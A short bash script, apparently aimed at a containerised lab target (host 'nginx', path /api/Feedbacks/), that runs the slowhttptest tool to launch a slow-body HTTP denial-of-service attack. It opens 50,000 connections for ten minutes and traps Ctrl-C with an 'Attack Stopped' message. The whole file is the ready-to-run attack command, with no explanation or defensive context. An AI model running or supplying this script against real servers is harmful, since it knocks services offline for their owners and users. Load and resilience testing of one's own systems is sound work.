#!/bin/bash

trap 'echo Attack Stopped; exit' INT
IP=nginx
PORT=80

slowhttptest -c 50000 -B -g -o my_body_stats -l 600 -i 5 -r 1000 -s 8192 -u http://${IP}:${PORT}/api/Feedbacks/ -x 10 -p 3